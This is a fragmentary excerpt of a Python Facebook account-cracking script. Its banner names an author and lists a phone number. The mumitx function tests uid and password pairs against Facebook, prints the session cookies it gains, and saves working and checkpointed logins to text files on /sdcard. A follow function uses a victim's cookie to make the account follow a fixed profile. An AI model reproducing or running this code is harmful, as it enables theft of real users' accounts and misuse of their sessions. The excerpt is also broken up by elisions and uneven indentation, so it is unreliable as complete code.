...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100070843021950', {
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mALHAMODEEN ATAL  ]\33[1;38m    \033[1;31m 
╠══[Facebook                 • ALHAMODEEN ATAL]    \033[1;97m  
╠══[Github                   • \33[1;38mALHAMODEEN ATALK-TIM ]  \33[1;34m   
╠══[Number                  • +93789937452 ]  \33[1;35m 
╠══[TOOLS                    • FREE ]          \33[1;32m   
...
def RAKIB():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] BD CODE : 078/079/077/076')
    linex()
    ...
    print('Ok Ids Saved in /ATAL-OK❤️.txt')
    print('Cp Ids Saved in /ATAL-CP😭.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ATAL-OK❤️] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/ATAL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[ATAL-CP😭]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/ATAL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
